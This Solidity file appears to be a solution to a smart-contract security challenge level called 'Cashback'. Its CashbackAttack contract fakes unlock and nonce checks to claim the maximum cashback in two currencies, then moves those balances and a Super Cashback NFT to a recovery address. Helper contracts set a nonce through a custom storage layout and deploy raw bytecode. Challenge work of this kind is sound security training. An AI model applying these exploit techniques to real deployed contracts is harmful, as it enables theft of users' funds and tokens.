// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {Currency, Cashback} from "src/levels/Cashback.sol";

contract CashbackAttack {
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    uint256 internal constant NATIVE_AMOUNT = 200000000000000000000;
    uint256 internal constant FREEDOM_COIN_AMOUNT = 25000000000000000000000;
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    bool nonceOnce;

    function attack(Cashback cashbackContract, IERC20 freedomCoin, IERC721 superCashbackNFT, address recovery)
        external
    {
        Currency freedomCoinCurrency = Currency.wrap(address(freedomCoin));

        // Get max cashback on both currencies
        cashbackContract.accrueCashback(NATIVE_CURRENCY, NATIVE_AMOUNT);
        cashbackContract.accrueCashback(freedomCoinCurrency, FREEDOM_COIN_AMOUNT);

        // Transfer balances to the recovery address
        cashbackContract.safeTransferFrom(address(this), recovery, NATIVE_CURRENCY.toId(), NATIVE_MAX_CASHBACK, "");
        cashbackContract.safeTransferFrom(address(this), recovery, freedomCoinCurrency.toId(), FREE_MAX_CASHBACK, "");

        // Transfer Super Cashback NFT to the recovery address
        superCashbackNFT.transferFrom(address(this), recovery, uint256(uint160(address(this))));
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        if (!nonceOnce) {
            nonceOnce = true;
            return SUPERCASHBACK_NONCE;
        }
        return 0;
    }
}

contract CashbackAttackNonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03 {
    uint256 public nonce;

    function setNonce(uint256 newNonce) external {
        nonce = newNonce;
    }
}

contract CashbackAttackBytecodeDeployer {
    function deployFromBytecode(bytes memory bytecode) public returns (address) {
        address child;
        assembly {
            child := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        return child;
    }
}
